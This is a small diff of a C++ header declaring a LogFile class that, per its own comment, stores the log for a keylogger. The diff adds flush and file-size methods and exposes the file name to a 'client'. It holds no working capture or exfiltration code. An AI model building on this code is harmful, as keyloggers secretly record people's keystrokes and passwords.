@@ -1,7 +1,6 @@
 #pragma once
 #include <Windows.h>
 
-
 /*
 	Class to represent a log file for the keylogger
 	It creates a temporary file upon initialization
@@ -14,8 +13,9 @@ public:
 	~LogFile(); // dtor
 
 	void AppendString(char* str);
+	void FlushContents();
+	int GetFileSize();
 
-private:
+	// used by client
 	char logFileName[MAX_PATH];
 };
-
